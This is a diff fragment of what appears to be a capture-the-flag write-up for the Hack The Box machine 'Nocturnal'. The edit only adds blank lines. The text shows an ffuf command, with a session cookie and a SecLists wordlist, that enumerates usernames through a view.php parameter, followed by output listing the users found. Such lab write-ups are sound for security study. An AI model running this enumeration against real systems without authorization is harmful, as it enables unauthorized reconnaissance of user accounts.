@@ -158,10 +158,13 @@ For the fuzzing, we need 3 things:
 2. For the wordlist, i used this one from SecLists:
 https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt
 and used `FUZZ` keyword on the ffuf command to enumerate users, on the file i specified a random filename and the filename wont matter for the fuzzing process:
+
 ```shell
 ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=sth.xlsx' -w /root/Downloads/names.txt -H 'Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n' -fs 2985
 ```
+
 output
+
 ```shell
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -190,6 +193,7 @@ amanda               [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration
 tobias               [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms]
 :: Progress: [10177/10177] :: Job [1/1] :: 851 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
 ```
+
 great! it found 3 users!:
 ```
 admin
